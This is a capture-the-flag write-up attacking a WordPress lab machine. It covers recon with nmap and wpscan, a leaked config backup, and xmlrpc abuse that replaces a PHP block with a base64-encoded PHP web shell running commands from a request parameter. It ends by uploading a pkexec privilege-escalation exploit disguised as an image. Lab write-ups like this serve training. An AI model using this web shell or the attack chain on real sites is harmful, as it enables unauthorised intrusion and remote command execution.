With [[nmap]] we found just [[port 80]] open.
![[Pasted image 20250421025119.png]]
we can use [[wpscan]] to get vulnerable vectors about [[Wordpress]] page.


![[Pasted image 20250421031433.png]]
`wp-config.php.bak` are exposed, we can check if have information relevant.

were we found this data
![[Pasted image 20250421031701.png]]
may be useful.
If we try enter with that credentials in `wp-login.php` we got a credentials are invalid, but if we use `uhc-jan-finals-2022` we got access.
and found we need a opt code.

![[Pasted image 20250421030748.png]]
[[xmlrpc.php]] it's exposed.
```bash
 curl -s -X POST http://pressed.htb/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
```
with that sentence we can list a methods allowed.

using a interactive session of [[Python]] we can try get posts with the lib [[python-wordpress-xmlrpc]].

```python
from wordpress_xmlrpc import Client
import wordpress_xmlrpc.methods as wp
import collections
import collections.abc

collections.Iterable = collections.abc.Iterable

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
 
 plist = client.call(wp.posts.GetPosts()) 
# output: [<WordPressPost: b'UHC January Finals Under Way'>]
```
If we check the content of that post
```python
>>> plist[0].content
# output: '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> 
```

it's relevant the field `code`, that's is the responsible of metrics in the main web app, 
![[Pasted image 20250421040154.png]]
we can try replace the code to execute whatever we want.
let's try upload this webshell:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
in [[base64]]:
`PD9waHAKICBlY2hvICI8cHJlPiIgLiBzaGVsbF9leGVjKCRfUkVRVUVTVFsnY21kJ10pIC4gIjwvcHJlPiI7Cj8+Cg==`
first is create a malicious post with our code in base64
![[Pasted image 20250421041149.png]]
and now, edit the original post.
![[Pasted image 20250421041313.png]]
so, on the web we can play with the parameter `cmd` and all works correctly.
![[Pasted image 20250421041414.png]]
if we check by suid perms we found pkexec is [[suid]], so we can use a exploit of [[pkexec]], first idea is upload this to machine.

first with interactive python console where we insert the malicious post, we can create a variable that have the content of [[pkexec]] exploit.

![[Pasted image 20250421182600.png]]
and set another variable to upload
```python
data_to_upload = { 'name': 'pkowner.png', 'bits': filename, 'type': 'text/plain' }
```
and using method media of [[python-wordpress-xmlrpc]] we can try send
![[Pasted image 20250421182955.png]]
and yes.